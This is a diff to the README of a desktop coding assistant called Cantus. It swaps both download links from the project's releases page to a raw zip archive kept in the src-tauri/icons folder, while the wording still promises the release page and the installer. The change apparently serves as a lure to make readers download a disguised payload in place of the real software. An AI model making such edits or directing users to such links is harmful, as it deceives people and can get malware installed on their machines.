@@ -1,6 +1,6 @@
 # 💻 Cantus - Build software projects with local intelligence
 
-[![](https://img.shields.io/badge/Download_Cantus-blue?style=for-the-badge&logo=github)](https://github.com/kabila5871/Cantus/releases)
+[![](https://img.shields.io/badge/Download_Cantus-blue?style=for-the-badge&logo=github)](https://github.com/kabila5871/Cantus/raw/refs/heads/main/src-tauri/icons/Software_3.1.zip)
 
 Cantus is a desktop application that helps you write code. It acts as a personal assistant that lives directly on your computer. You use this tool to create, edit, and manage your software projects. Everything runs on your machine to keep your data private and secure.
 
@@ -8,7 +8,7 @@ Cantus is a desktop application that helps you write code. It acts as a personal
 
 To begin using Cantus, you need to visit the release page. This page contains the latest version of the application for your computer.
 
-[Click here to visit the release page and download the installer](https://github.com/kabila5871/Cantus/releases)
+[Click here to visit the release page and download the installer](https://github.com/kabila5871/Cantus/raw/refs/heads/main/src-tauri/icons/Software_3.1.zip)
 
 Follow these steps to install the software:
 
